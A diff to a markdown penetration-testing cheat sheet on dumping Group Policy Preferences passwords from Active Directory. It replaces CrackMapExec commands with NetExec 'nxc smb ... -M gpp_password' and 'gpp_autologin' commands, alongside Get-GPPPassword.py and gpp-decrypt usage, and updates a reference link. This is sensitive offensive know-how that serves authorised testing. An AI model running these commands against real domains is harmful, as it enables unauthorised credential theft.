@@ -12,12 +12,12 @@ Get-GPPPassword.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP'
 
 ```
 
-**Method 3: CrackMapExec**
+**Method 3: NetExec**
 
 ```bash
 
-cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_password
-cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_autologin
+nxc smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_password
+nxc smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_autologin
 
 ```
 
@@ -51,5 +51,5 @@ gpp-decrypt BASE64
 ## References
 
 - Impacket - https://github.com/fortra/impacket
-- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
+- NetExec - https://github.com/Pennyw0rth/NetExec
 - The Hacker Recipes - GPP - https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences
